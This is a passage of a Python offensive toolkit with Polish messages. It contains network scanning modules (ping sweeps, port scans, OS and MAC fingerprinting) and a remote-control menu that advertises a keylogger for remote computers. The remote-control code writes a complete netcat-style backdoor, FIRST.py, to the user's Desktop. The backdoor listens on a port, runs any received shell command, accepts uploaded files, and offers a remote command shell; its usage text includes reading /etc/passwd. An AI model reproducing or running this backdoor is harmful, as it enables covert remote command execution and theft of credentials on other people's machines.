                                   9628: 'odbcpathway', 9629: 'uniport', 9630: 'peoctlr', 9631: 'peocoll', 9632: 'mc-comm', 9640: 'pqsflows', 9666: 'zoomcp', 9667: 'xmms2', 9668: 'tec5-sdctp',
                                   9694: 'client-wakeup',
                                   9695: 'ccnx',
                                   9700: 'board-roar', 9747: 'l5nas-parchan', 9750: 'board-voip', 9753: 'rasadv', 9762: 'tungsten-http', 9800: 'davsrc', 9801: 'sstp-2', 9802: 'davsrcs', 9875: 'sapv1',
                                   9876: 'sd',
                                   9878: 'kca-service',
                                   9888: 'cyborg-systems', 9889: 'gt-proxy', 9898: 'monkeycom', 9899: 'sctp-tunneling', 9900: 'iua', 9903: 'multicast-ping', 9909: 'domaintime', 9911: 'sype-transport',
                                   9925: 'xybrid-cloud',
                                   9929: 'nping-echo', 9950: 'apc-9950', 9951: 'apc-9951', 9952: 'apc-9952', 9953: 'acis', 9954: 'hinp', 9955: 'alljoyn-stm', 9956: 'alljoyn', 9966: 'odnsp',
                                   9975: 'unknown',
                                   9978: 'xybrid-rt',
                                   9979: 'visweather', 9981: 'pumpkindb', 9987: 'dsm-scm-target', 9988: 'nsesrvr', 9990: 'osm-appsrvr', 9991: 'issa', 9992: 'issc', 9993: 'palace-2', 9994: 'palace-3',
                                   9995: 'palace-4',
                                   9996: 'palace-5', 9997: 'palace-6', 9998: 'distinct32', 9999: 'abyss'}

    def network_scanner_menu(self):

        if NetworkScanner.again == 0:
            network_scanner_load_message = f"{Bcolors.Magenta}Network Scanner{Bcolors.ENDC} is starts up...."
            for char in network_scanner_load_message:
                sys.stdout.write(char)
                sys.stdout.flush()
                time.sleep(0.05)
            time.sleep(1.5)
        Clear.clear()

        print(20 * '-' + f"{Bcolors.Magenta}NETWORK SCANNER MENU{Bcolors.ENDC}" + 20 * '-')
        print(f"{Bcolors.WARNING}1.QUICK MODULE{Bcolors.ENDC}")
        print(f"{Bcolors.WARNING}2.INTENSE MODULE{Bcolors.ENDC}")
        print(f"{Bcolors.WARNING}3.SINGLE TARGET MODULE{Bcolors.ENDC}")
        print(f"{Bcolors.WARNING}0.BACK TO MAIN MENU{Bcolors.ENDC}")
        print(60 * '-')
        try:
            network_scanner_menu_options = [1, 2, 3, 0]
            self.network_scanner_module_choice = int(input('> '))
            check_options = [option == self.network_scanner_module_choice for option in network_scanner_menu_options]
            Clear.clear()
            if any(check_options):
                pass
            else:
                print(f"{Bcolors.Error}WRONG{Bcolors.ENDC} there is no such option!")
                time.sleep(2)
                NetworkScanner.again = 1
                NetworkScanner().network_scanner_menu()
        except ValueError:
            Clear.clear()
            print(f"{Bcolors.Error}INVALID{Bcolors.ENDC} input data type! Data type must be {Bcolors.WARNING}int{Bcolors.ENDC} type.")
            time.sleep(2.5)
            NetworkScanner.again = 1
            NetworkScanner().network_scanner_menu()

        if self.network_scanner_module_choice == 1:
            Clear.clear()
            NetworkScannerModuleQuick().network_scanner_quick_module_start()
        elif self.network_scanner_module_choice == 2:
            Clear.clear()
            NetworkScannerModuleIntense().network_scanner_module_intense_start()
        elif self.network_scanner_module_choice == 3 or NetworkScanner.again == 2:
            Clear.clear()
            print(24 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER SINGLE TARGET MODULE{Bcolors.ENDC}' + 24 * '-')
            print(
                f'This script will thoroughly scan one selected host.\nIf the host is in the network, the script will receive \n-{Bcolors.WARNING}IP ADDRESS{Bcolors.ENDC}\n-{Bcolors.WARNING}MAC ADDRESS{Bcolors.ENDC}\n-{Bcolors.WARNING}HOSTNAME{Bcolors.ENDC}\n-{Bcolors.WARNING}OPERATING SYSTEM NAME{Bcolors.ENDC}\nScript will also quickly scan 9999 {Bcolors.WARNING}PORTS{Bcolors.ENDC}, if any is {Bcolors.Pass}OPEN{Bcolors.ENDC} it will try to \ndetect a {Bcolors.WARNING}SERVICE{Bcolors.ENDC} running on that port.\n')
            print(f'Do you want to continue? {Bcolors.WARNING}Y/N{Bcolors.ENDC}')
            print(84 * '-')
            network_scanner_single_target_module_start_choice = str(input('> '))
            if network_scanner_single_target_module_start_choice == 'y' or network_scanner_single_target_module_start_choice == 'Y':
                NetworkScanner.again = 2
                Clear.clear()
                pass
            elif network_scanner_single_target_module_start_choice == 'n' or network_scanner_single_target_module_start_choice == 'N':
                Clear.clear()
                NetworkScanner().network_scanner_menu()
            else:
                NetworkScanner.again = 2
                Clear.clear()
                print(f"{Bcolors.Error}WRONG{Bcolors.ENDC} option!")
                time.sleep(1)
                NetworkScanner().network_scanner_menu()

            self.type_of_port_scanning = False
            while len(self.ip) != 4:
                Clear.clear()
                print(f"Below enter {Bcolors.WARNING}IP{Bcolors.ENDC} of computer what you want to scan")
                print(48 * '-')
                NetworkScannerModuleSingleTarget.target_ip = str(input('> '))
                self.ip = NetworkScannerModuleSingleTarget.target_ip
                self.ip = self.ip.split('.')
                Clear.clear()
                if len(self.ip) != 4:
                    print(f"{Bcolors.Error}WRONG{Bcolors.ENDC} IP address!")
                    time.sleep(2)
                else:
                    command = ping(NetworkScannerModuleSingleTarget.target_ip, timeout=0.1, count=1)
                    if command.success():
                        pass
                    else:
                        NetworkScanner.again = 2
                        Clear.clear()
                        print(f"{Bcolors.Error}ERROR{Bcolors.ENDC} Host with IP: {Bcolors.WARNING}{NetworkScannerModuleSingleTarget.target_ip}{Bcolors.ENDC} is down!")
                        time.sleep(2)
                        NetworkScanner().network_scanner_menu()

            self.ip = NetworkScannerModuleSingleTarget.target_ip
            Clear.clear()
            print(f"{Bcolors.WARNING}WAIT{Bcolors.ENDC} the script scans this {Bcolors.WARNING}{NetworkScannerModuleSingleTarget.target_ip}{Bcolors.ENDC} IP address\n")
            NetworkScannerModuleIntense.network_scanner_main_scanning_function(self)
            NetworkScannerModuleSingleTarget().single_target_scanner(777)

        elif self.network_scanner_module_choice == 0:
            NetworkScanner.again = 0
            MainMenu().menu()

    def network_scanner_main_scanning_function(self):
        command = ping(self.ip, timeout=0.1, count=1)
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        param2 = '-w' if platform.system().lower() == 'windows' else '-c'
        if platform.system().lower() == 'windows':
            command_after = ['ping', param, '1', param2, '100', self.ip]
        else:
            command_after = ['ping', param, '1', self.ip]
        try:
            if command.success():
                print('\n' + 31 * '-' + f'{Bcolors.Pass}{self.ip}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE{Bcolors.ENDC}' + 31 * '-')
                print(f'Script will try to get more information about host {Bcolors.WARNING}{self.ip}{Bcolors.ENDC} ....')
                if 'TTL' in subprocess.check_output(command_after).decode(
                        'UTF-8') or 'ttl' in subprocess.check_output(command_after).decode('UTF-8'):
                    self.mac = getmac.get_mac_address(ip=str(self.ip))
                    NetworkScanner.network_scanner_get_remote_hostname(self)
                    if self.mac is None:
                        self.mac = getmac.get_mac_address()
                    if '128' in subprocess.check_output(command_after).decode('UTF-8'):
                        self.platform = 'Windows'
                        print(
                            f'{Bcolors.ENDC}Platform: {Bcolors.WARNING}{self.platform}{Bcolors.ENDC} Hostname: {Bcolors.WARNING}{self.hostname}{Bcolors.ENDC}  IP: {Bcolors.WARNING}{self.ip}{Bcolors.ENDC}  MAC: {Bcolors.WARNING}{self.mac}{Bcolors.ENDC}')
                        if self.type_of_port_scanning:
                            self.network_scanner_check_open_ports()
                    elif '64' in subprocess.check_output(command_after).decode('UTF-8'):
                        self.platform = 'Linux'
                        print(
                            f'{Bcolors.ENDC}Platform: {Bcolors.WARNING}{self.platform}{Bcolors.ENDC} Hostname: {Bcolors.WARNING}{self.hostname}{Bcolors.ENDC}  IP: {Bcolors.WARNING}{self.ip}{Bcolors.ENDC}  MAC: {Bcolors.WARNING}{self.mac}{Bcolors.ENDC}')
                        if self.type_of_port_scanning:
                            self.network_scanner_check_open_ports()
                    if self.type_of_port_scanning:
                        NetworkScannerModuleIntense.network_scanner_module_intense_save_output(self)

                else:
                    print(f'Most likely Device with IP: {self.ip} is {Bcolors.Error}turned off.{Bcolors.ENDC}')
                    print(f'\n')

            else:
                pass

        except subprocess.CalledProcessError:
            pass

    def network_scanner_check_open_ports(self):

        for self.port in range(1, self.port_range):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.0001)
            result = sock.connect_ex((self.ip, self.port,))
            for port, service in self.all_services.items():
                if port == self.port:
                    self.service = service
            """
            try:
                self.service = socket.getservbyport(self.port, 'tcp')
            except OSError:
                pass
            """
            if result == 0:
                print(
                    f'Host {Bcolors.WARNING}{self.hostname}{Bcolors.ENDC} with IP: {Bcolors.WARNING}{self.ip}{Bcolors.ENDC} has an open port number: {Bcolors.WARNING}{self.port}{Bcolors.ENDC}. Service: {Bcolors.WARNING}{self.service}{Bcolors.ENDC}')
                self.OpenPortsAndServices.update({f'{self.port}': self.service})
            sock.close()
        print(84 * '=' + '\n')

    def network_scanner_get_remote_hostname(self):
        try:
            self.hostname = socket.gethostbyaddr(self.ip)[0]
        except socket.herror:
            self.hostname = 'Unknown'
            print(f"Device with IP: {self.ip} is in {Bcolors.Error}drop mode{Bcolors.ENDC}. Script can't find HOSTNAME")


class NetworkScannerModuleQuick(NetworkScanner):

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        super().__init__()

    def network_scanner_quick_module_start(self):
        Clear.clear()
        print(28 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER QUICK MODULE{Bcolors.ENDC}' + 28 * '-')
        print(f'{Bcolors.Magenta}QUICK{Bcolors.ENDC} module will find all {Bcolors.Pass}ACTIVE{Bcolors.ENDC} hosts in chosen network and display\nthier {Bcolors.WARNING}IP{Bcolors.ENDC} address.\n')
        print(f'Do you want to continue? {Bcolors.WARNING}Y/N{Bcolors.ENDC}')
        print(84 * '-')
        network_scanner_quick_module_start_choice = str(input('> '))
        Clear.clear()
        if network_scanner_quick_module_start_choice.lower() == 'y':
            NetworkScannerModuleQuick().network_scanner_quick_module_scanner()
        elif network_scanner_quick_module_start_choice.lower() == 'n':
            NetworkScanner.again = 1
            NetworkScanner().network_scanner_menu()
        else:
            print(f"{Bcolors.Error}Wrong{Bcolors.ENDC} option!")
            time.sleep(2)
            NetworkScannerModuleQuick().network_scanner_quick_module_start()

    def network_scanner_quick_module_scanner(self):
        Clear.clear()
        parts_ip = self.user_ip.split('.')
        part_0, part_1, part_2 = parts_ip[0], parts_ip[1], parts_ip[2]
        user_recommended_ip = part_0 + '.' + part_1 + '.' + part_2 + '.'
        print(28 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER QUICK MODULE{Bcolors.ENDC}' + 28 * '-')
        if scanned_network_areas().__len__() > 0:
            print(f'Script finded networks areas where probably work devices with \ninternet connection. Do you want to see this network areas? {Bcolors.WARNING}Y/N{Bcolors.ENDC}')
            print(84 * '-')
            show_possible_networks = str(input('> '))
            if show_possible_networks.upper() == 'Y':
                for possible_n in scanned_network_areas():
                    print(f'Possible network area with active devices: {Bcolors.WARNING}{possible_n}{Bcolors.ENDC}')
                print(84 * '-')
            else:
                Clear.clear()
                print(28 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER QUICK MODULE{Bcolors.ENDC}' + 28 * '-')
        print(f'YOUR IP ADDRESS: {Bcolors.WARNING}{UserInfo.user_ip}{Bcolors.ENDC}')
        print(
            f'{Bcolors.WARNING}RECOMMENDED{Bcolors.ENDC} If you want to scan your network enter {Bcolors.WARNING}{user_recommended_ip}{Bcolors.ENDC}\nIf you want to scan other network area just enter IP address from other network area.')
        print(84 * '-')
        c = True
        while c:
            self.ip = str(input('> '))
            self.ip = self.ip.split('.')
            if len(self.ip) == 4 or len(self.ip) == 3:
                self.ip = self.ip[0] + '.' + self.ip[1] + '.' + self.ip[2] + '.'
                c = False
            else:
                print('Wrong IP address!')

        self.ip_list = [f'{self.ip}{num}' for num in range(1, 255)]
        self.start_time = time.time()
        ip_active = []
        try:
            for single_target in self.ip_list:
                if single_target == self.ip_list[-1]:
                    print()
                    if len(ip_active) < 5:
                        print(f"The script will try to find more hosts, {Bcolors.WARNING}WAIT{Bcolors.ENDC}...\n")
                        for single_target in self.ip_list:
                            if single_target == self.ip_list[-1]:
                                print()
                                if not ip_active:
                                    print(f"Script can't find any active host in given network area. Use {Bcolors.Magenta}INTENSE MODULE{Bcolors.ENDC} or scan other network area.")
                                    os.system('pause') if os.name == 'nt' else input('Press enter to continue...')
                                else:
                                    print(f'{Bcolors.Pass}FINISHED SCAN!{Bcolors.ENDC}')
                                    print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (
                                            time.time() - self.start_time))
                                    os.system('pause') if os.name == 'nt' else input('Press enter to continue...')

                            command = ping(f'{single_target}', timeout=0.1, count=1)
                            if command.success():
                                ip_active.append(single_target)
                                print(f'Host with IP:{Bcolors.WARNING} {single_target}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE.{Bcolors.ENDC}')
                            else:
                                pass
                    else:
                        print(f'{Bcolors.Pass}FINISHED SCAN!{Bcolors.ENDC}')
                        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - self.start_time))
                        os.system('pause') if os.name == 'nt' else input('Press enter to continue...')

                command = ping(f'{single_target}', timeout=0.01, count=1)
                if command.success():
                    ip_active.append(single_target)
                    print(f'Host with IP:{Bcolors.WARNING} {single_target}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE.{Bcolors.ENDC}')
                else:
                    pass
        finally:
            Clear.clear()
            if ip_active.__len__() != 0:
                print(27 * '-' + f"{Bcolors.Magenta}ALL DISCOVERED ACTIVE DEVICES{Bcolors.ENDC}" + 27 * '-')
                ip_active = sorted(list(dict.fromkeys(ip_active)))
                while ip_active:
                    print(f'Host with IP: {Bcolors.WARNING}{[active_host for active_host in ip_active][0]}{Bcolors.ENDC} is {Bcolors.Pass}ACTIVE.{Bcolors.ENDC}')
                    del ip_active[0]
                print(83 * '-')
                os.system('pause') if os.name == 'nt' else input('Press enter to continue...')
            MainMenu().menu()


class NetworkScannerModuleIntense(NetworkScanner):

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        super().__init__()

    def network_scanner_module_intense_start(self):
        Clear.clear()
        print(27 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER INTENSE MODULE{Bcolors.ENDC}' + 27 * '-')
        print(
            f'{Bcolors.Magenta}INTENSE{Bcolors.ENDC} module will search for {Bcolors.Pass}ACTIVE{Bcolors.ENDC} hosts  in chosen network, if it\nhits the {Bcolors.Pass}ACTIVE{Bcolors.ENDC} host,it will try \nto get as much information as possible about this active host.')
        print(
            f'For example, this script will try to find the: \n-{Bcolors.WARNING}IP ADDRESS{Bcolors.ENDC}\n-{Bcolors.WARNING}MAC ADDRESS{Bcolors.ENDC}\n-{Bcolors.WARNING}HOSTNAME{Bcolors.ENDC}\n-{Bcolors.WARNING}OPERATING SYSTEM NAME{Bcolors.ENDC}\nThis script will search for all {Bcolors.Pass}OPEN {Bcolors.ENDC}{Bcolors.WARNING}PORTS{Bcolors.ENDC} on this {Bcolors.Pass}ACTIVE{Bcolors.ENDC} host,\nif any are {Bcolors.Pass}OPEN{Bcolors.ENDC} it will try to find out what {Bcolors.WARNING}SERVICES{Bcolors.ENDC} work on these ports.\n')
        print(f'Do you want to continue? {Bcolors.WARNING}Y/N{Bcolors.ENDC}')
        print(84 * '-')
        network_scanner_module_intense_start_choice = str(input('> '))
        Clear.clear()
        if network_scanner_module_intense_start_choice.lower() == 'y':
            NetworkScannerModuleIntense().network_scanner_module_intense_find_place_to_save_output()
        elif network_scanner_module_intense_start_choice.lower() == 'n':
            NetworkScanner.again = 1
            NetworkScanner().network_scanner_menu()
        else:
            print(f"{Bcolors.Error}Wrong{Bcolors.ENDC} option!")
            time.sleep(2)
            NetworkScannerModuleIntense().network_scanner_module_intense_start()

    def network_scanner_module_intense_find_place_to_save_output(self):
        Clear.clear()
        print(27 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER INTENSE MODULE{Bcolors.ENDC}' + 27 * '-')
        if os.name == 'nt':
            self.check_default = os.path.isdir(rf'C:\Users\{self.user_name}\Desktop')
        if os.name != 'nt':
            self.check_default = os.path.isdir(rf'/root')
        if self.check_default:
            if os.name == 'nt':
                self.check_default = os.path.abspath(rf'C:\Users\{self.user_name}\Desktop')
                self.check_default = rf'C:\Users\{self.user_name}\Desktop\ActiveHosts.txt'
                print(f"Script will save all results in this location: {Bcolors.WARNING}{self.check_default}{Bcolors.ENDC}\n")
                os.system('pause')
                Clear.clear()
            if os.name != 'nt':
                self.check_default = os.path.abspath(rf'/root')
                self.check_default = rf'/root/ActiveHosts.txt'
                print(f"Script will save all results in this location: {Bcolors.WARNING}{self.check_default}{Bcolors.ENDC}{Bcolors.ENDC}\n")
                input("Type enter to continue...")
                Clear.clear()

            self.ActiveHosts = self.check_default
            NetworkScannerModuleIntense.network_scanner_module_intense_scanner(self)

    def network_scanner_module_intense_save_output(self):
        with open(self.ActiveHosts, 'a') as fp:
            fp.write(38 * '=' + '\n')
            fp.write(f'Platform: {self.platform}' + '\n')
            fp.write(f'HOST: {self.hostname}' + '\n')
            fp.write(f'IP: {self.ip}' + '\n')
            fp.write(f'MAC: {self.mac}' + '\n')
            for self.port in self.OpenPortsAndServices:
                fp.write(f'Port: {self.port}' + ' ' + ' Service: ' + self.OpenPortsAndServices[self.port] + '\n')
            self.OpenPortsAndServices.clear()

    def network_scanner_module_intense_scanner(self):
        while self.port_range == 11111000111:
            print(27 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER INTENSE MODULE{Bcolors.ENDC}' + 27 * '-')
            print(f'How many {Bcolors.WARNING}PORTS{Bcolors.ENDC} do you want to scan? 1-9999')
            try:
                print(84 * '-')
                self.port_range = int(input('> '))
                Clear.clear()
                if 0 < self.port_range < 10000:
                    if self.port_range is type(int):
                        break

                if self.port_range > 9999:
                    self.port_range = 11111000111
                    print(f'Maximum port value is {Bcolors.Error}9999{Bcolors.ENDC}!')
                    time.sleep(1.5)
                    Clear.clear()

                if self.port_range <= 0:
                    self.port_range = 11111000111
                    print(f'Minimum port value is {Bcolors.Error}1{Bcolors.ENDC}!')
                    time.sleep(1.5)
                    Clear.clear()

            except ValueError:
                print(f'The given value is not an {Bcolors.Error}int{Bcolors.ENDC} type !')
                time.sleep(1.5)
                Clear.clear()

        parts_ip = UserInfo.user_ip.split('.')
        part_0, part_1, part_2 = parts_ip[0], parts_ip[1], parts_ip[2]
        user_recommended_ip = part_0 + '.' + part_1 + '.' + part_2 + '.'
        print(27 * '-' + f'{Bcolors.Magenta}NETWORK SCANNER INTENSE MODULE{Bcolors.ENDC}' + 27 * '-')
        print(f'YOUR IP ADDRESS: {Bcolors.WARNING}{UserInfo.user_ip}{Bcolors.ENDC}')
        print(f'{Bcolors.WARNING}RECOMMENDED{Bcolors.ENDC} If you want to scan your network type {Bcolors.WARNING}{user_recommended_ip}{Bcolors.ENDC}')
        c = True
        while c:
            print(84 * '-')
            self.ip = str(input('> '))
            self.ip = self.ip.split('.')
            if len(self.ip) == 4:
                self.ip = self.ip[0] + '.' + self.ip[1] + '.' + self.ip[2] + '.'
                c = False
            elif len(self.ip) == 3:
                self.ip = self.ip[0] + '.' + self.ip[1] + '.' + self.ip[2] + '.'
                c = False
                pass
            else:
                print('Wrong IP address!')
        self.start_time = time.time()
        self.ip_list = [f'{self.ip}{num}' for num in range(1, 255)]

        for self.ip in self.ip_list:
            if self.ip == self.ip_list[-1]:
                print()
                print(f'{Bcolors.Pass}FINISHED SCAN!{Bcolors.ENDC}')
                print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % (time.time() - self.start_time))
                if os.name == 'nt':
                    os.system('pause')
                    Clear.clear()
                    os.system(fr'more {self.ActiveHosts}')
                    print()
                    print(f'All results are saved here: {Bcolors.Pass}{self.ActiveHosts}{Bcolors.ENDC}')
                    os.system('pause')
                    MainMenu().menu()
                elif os.name != 'nt':
                    input('Press enter to continue...')
                    os.system(fr'less {self.ActiveHosts}')
                    print()
                    print(f'All results are saved here: {Bcolors.Pass}{self.ActiveHosts}{Bcolors.ENDC}')
                    input('Press enter to continue...')
                    input()
                    MainMenu().menu()

            NetworkScanner.network_scanner_main_scanning_function(self)


class NetworkScannerModuleSingleTarget(NetworkScanner):

    def __repr__(self):
        return f'{self.__class__.__name__}'

    def __init__(self):
        super().__init__()

    queue = Queue()
    single_target_open_ports: list = []
    target_ip: str = ''
    ports_percentage: dict = {999: '10%', 1999: '20%', 2999: '30%', 3999: '40%', 4999: '50%', 5999: '60%', 6999: '70%', 7999: '80%', 8999: '90%'}

    @staticmethod
    def single_target_restart_line():
        sys.stdout.write('\r')
        sys.stdout.flush()

    @staticmethod
    def single_target_port_scan_with_threads(port):
        for key, value in NetworkScannerModuleSingleTarget.ports_percentage.items():
            if port == key:
                sys.stdout.write(f'{value} of all ports is scanned!')
                sys.stdout.flush()
                NetworkScannerModuleSingleTarget.single_target_restart_line()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((NetworkScannerModuleSingleTarget.target_ip, port))
            sock.settimeout(0.5)
            return True
        except (ConnectionRefusedError, OSError):
            pass

    @staticmethod
    def single_target_get_ports():
        for port in range(1, 9999):
            NetworkScannerModuleSingleTarget.queue.put(port)

    @staticmethod
    def single_target_worker():
        while not NetworkScannerModuleSingleTarget.queue.empty():
            port = NetworkScannerModuleSingleTarget.queue.get()
            if NetworkScannerModuleSingleTarget.single_target_port_scan_with_threads(port):
                NetworkScannerModuleSingleTarget.single_target_open_ports.append(port)

    @staticmethod
    def single_target_scanner(threads):

        NetworkScannerModuleSingleTarget.single_target_get_ports()
        thread_list = []

        for t in range(threads):
            thread = Thread(target=NetworkScannerModuleSingleTarget.single_target_worker)
            thread_list.append(thread)

        for thread in thread_list:
            thread.start()

        for thread in thread_list:
            thread.join()

        NetworkScannerModuleSingleTarget().single_target_port_output()

    def single_target_port_output(self):
        while len(NetworkScannerModuleSingleTarget.single_target_open_ports):
            port_and_service = next(((port, service) for port, service in self.all_services.items() if port == NetworkScannerModuleSingleTarget.single_target_open_ports[0]), None)
            if port_and_service is None:
                port, service = NetworkScannerModuleSingleTarget.single_target_open_ports[0], 'Unknown'
            else:
                port, service = port_and_service
            print(
                f'Host {Bcolors.WARNING}HOSTNAME{Bcolors.ENDC} with IP: {Bcolors.WARNING}{NetworkScannerModuleSingleTarget.target_ip}{Bcolors.ENDC} has an open port number: {Bcolors.WARNING}{port}{Bcolors.ENDC}. Service: {Bcolors.WARNING}{service}{Bcolors.ENDC}')
            del NetworkScannerModuleSingleTarget.single_target_open_ports[0]
        print()
        os.system('pause') if os.name == 'nt' else input('Press any key to continue...')
        MainMenu().menu()


class RemoteControl(UserInfo):

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        super().__init__()
        self.check_default_FIRST: str = ''

    def remote_control_startup(self):
        print('-' * 70)
        print(
            f'This modules allows you to remotely connect to other computer.\nBy using {Bcolors.WARNING}SSH{Bcolors.ENDC} or {Bcolors.WARNING}FIRST MODULE{Bcolors.ENDC} you can execute command on remote\ncomputers as well as you can upload generated {Bcolors.WARNING}KEY-HOOK\nto catch all symbols from keyboard connected with remote computer{Bcolors.ENDC}.')
        print(f'Do you want to continue {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        print('-' * 70)
        remote_control_choice = str(input('> '))
        Clear.clear()
        if remote_control_choice.lower() == 'y':
            time.sleep(1)
            Clear.clear()
            RemoteControl.remote_control_menu(self)
        elif remote_control_choice.lower() == 'n':
            time.sleep(1)
            MainMenu().menu()
        else:
            print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} Wrong choice!')
            time.sleep(2)
            MainMenu().menu()

    def remote_control_menu(self):
        print(25 * '-' + f'{Bcolors.Magenta}REMOTE CONTROL MENU {Bcolors.ENDC}' + 25 * '-')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}1.SSH{Bcolors.ENDC}')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}2.FIRST{Bcolors.ENDC}')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}0.BACK TO MAIN MENU{Bcolors.ENDC}')
        time.sleep(0.25)
        print(70 * '-')
        remote_control_menu_choice = str(input('> '))
        if remote_control_menu_choice == '1':
            Clear.clear()
            SSH().shh_start_choice()
        elif remote_control_menu_choice == '2':
            Clear.clear()
            try:
                self.check_default_FIRST = os.path.isdir(rf'C:\Users\{self.user_name}\Desktop')
                self.check_default_FIRST = os.path.abspath(rf'C:\Users\{self.user_name}\Desktop')
                self.check_default_FIRST = rf'C:\Users\{self.user_name}\Desktop\FIRST.py'
            except OSError:
                print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} I have problems with save!')
                time.sleep(2)
            Clear.clear()
            with open(self.check_default_FIRST, 'w') as f:
                f.write(r"""
# -*- coding: big5 -*-
# !/opt/local/bin/python3
import sys
import socket
import getopt
import threading
import subprocess
import pdb
class First:
    def __init__(self):
        self.listen: bool = False
        self.command: bool = False
        self.upload: bool = False
        self.execute: str = ""
        self.target: str = ""
        self.upload_destination: str = ""
        self.port: int = 0
    def run_command(self, command: bytes):
        command = command.decode('utf8').rstrip()
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        except:
            output = "Nie udalo sie wykonac polecenia.\r\n"
        return output
    def client_handler(self, client_socket):
        print('Polaczenie', self, client_socket, file=sys.stderr)
        if len(self.upload_destination):
            file_buffer = ""
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                else:
                    file_buffer += data
            try:
                file_descriptor = open(self.upload_destination, "wb")
                file_descriptor.write(file_buffer)
                file_descriptor.close()
                client_socket.send(("Zapisano plik w %s\r\n" % (self.upload_destination,)).encode('utf8'))
            except:
                client_socket.send(("Nie udalo sie zapisac pliku w %s\r\n" % (self.upload_destination,)).encode('utf8'))
        if len(self.execute):
            output = self.run_command(self.execute)
            client_socket.send(output.encode('utf8'))
        if self.command:
            while True:
                client_socket.send(b"<FIRST:#> ")
                cmd_buffer = b""
                while b"\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)
                response = self.run_command(cmd_buffer)
                client_socket.send(response)
    def server_loop(self):
        if not len(self.target):
            self.target = "0.0.0.0"
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.target, self.port))
        server.listen(5)
        while True:
            client_socket, addr = server.accept()
            print('Accepting %s from %s' % (client_socket, addr))
            client_thread = threading.Thread(target=First.client_handler, args=(self, client_socket,))
            client_thread.start()
    def client_sender(self, buffer: str):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((self.target, self.port))
            print("Connect to:", self.target, "\n" + "On port:", self.port)
            if len(buffer):
                client.send(buffer.encode('utf8'))
            while True:
                recv_len = 1
                response = b""
                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data
                    if recv_len < 4096:
                        break
                print(response.decode('utf8')),
                buffer = input("")
                buffer += "\n"
                client.send(buffer.encode('utf8'))
        except:
            print("\n" + "Lost Connection!", "\n" + "Error: Wyjatek[*]")
            client.close()
    def main(self):
        if not len(sys.argv[1:]):
            self.usage()
        try:
            opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                       ["help", "listen", "execute", "target", "port", "command", "upload"])
        except getopt.GetoptError as err:
            self.usage()
        for o, a in opts:
            if o in ("-h", "--help"):
                self.usage()
            elif o in ("-l", "--listen"):
                self.listen = True
            elif o in ("-e", "--execute"):
                self.execute = a
            elif o in ("-c", "--commandshell"):
                self.command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                self.target = a
            elif o in ("-p", "--port"):
                self.port = int(a)
            else:
                assert False, "Nieobslugiwana opcja"
        if not self.listen and len(self.target) and self.port > 0:
            buffer = sys.stdin.readline()
            self.client_sender(buffer)
        if self.listen:
            self.server_loop()
    def usage(self):
        print('''
    Sposob uzycia: FIRST.py -t target_host -p port
    -l --listen                - nasluchuje na [host]:[port] przychodzacych polaczen
    -e --execute=file_to_run   - wykonuje dany plik, gdy zostanie nawiązanie połaczenie
    -c --command               - inicjuje wiersz polecen
    -u --upload=destination    - po nawiazaniu polaczenia wysyła plik i zapisuje go w [destination]
    -t -target                  - adres ip
    Przyklady: 
    first.py -t 192.168.0.1 -p 5555 -l -c
    first.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
    first.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\
    echo 'ABCDEFGHI' | ./first.py -t 192.168.11.12 -p 135
    Rozpoczecie nasluchiwania:
    python3 FIRST.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python3 FIRST.py -t 192.168.0.1 -p 1234 
    Ewentualnie:
    Rozpoczecie nasluchiwania:
    python FIRST.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python FIRST.py -t 192.168.0.1 -p 1234 
    ''')
        sys.exit(0)
if __name__ == '__main__':
    First().main()
            """)
            Clear.clear()
            print(f'Script will save here: {Bcolors.WARNING}{self.check_default_FIRST}{Bcolors.ENDC}')
            os.system('Pause') if os.name == 'nt' else input('Press enter to continue')
            MainMenu().menu()
        elif remote_control_menu_choice == '0':
            main_menu = MainMenu()
            main_menu.menu()
        else:
            print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} Wrong choice!')
            time.sleep(2)
            MainMenu().menu()


class SSH:

    def __repr__(self):
        return f"{self.__class__.__name__}"

    @staticmethod
    def shh_start_choice():
        Clear.clear()
        print(70 * '-')
        print(
